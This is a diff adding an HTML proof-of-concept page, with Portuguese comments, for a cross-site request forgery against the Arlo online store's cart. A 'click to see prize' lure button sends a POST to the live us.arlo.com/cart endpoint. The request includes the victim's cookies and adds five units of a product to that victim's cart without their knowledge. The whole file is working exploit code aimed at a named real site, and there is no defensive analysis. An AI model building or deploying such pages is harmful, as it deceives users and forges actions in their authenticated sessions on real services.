@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - Arlo Cart</title>
+</head>
+<body>
+    <h1>Clique para "ver prêmio" (mas adiciona item ao seu carrinho Arlo!)</h1>
+    <button onclick="exploitCSRF()">Clique Aqui</button>
+    <script>
+        function exploitCSRF() {
+            // Requisição AJAX imitando o POST para /cart
+            fetch('https://us.arlo.com/cart', {
+                method: 'POST',
+                credentials: 'include',  // Inclui cookies da vítima (essencial para auth)
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    // Adicione headers capturados se necessário, ex.: 'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: 'id=1050&quantity=5'  // Ajuste: Adiciona 5 unidades do produto 1050
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('Exploit enviado! Verifique seu carrinho na Arlo.');
+                console.log('Resposta:', data);  // Para debug
+            })
+            .catch(error => console.error('Erro:', error));
+        }
+    </script>
+</body>
+</html>
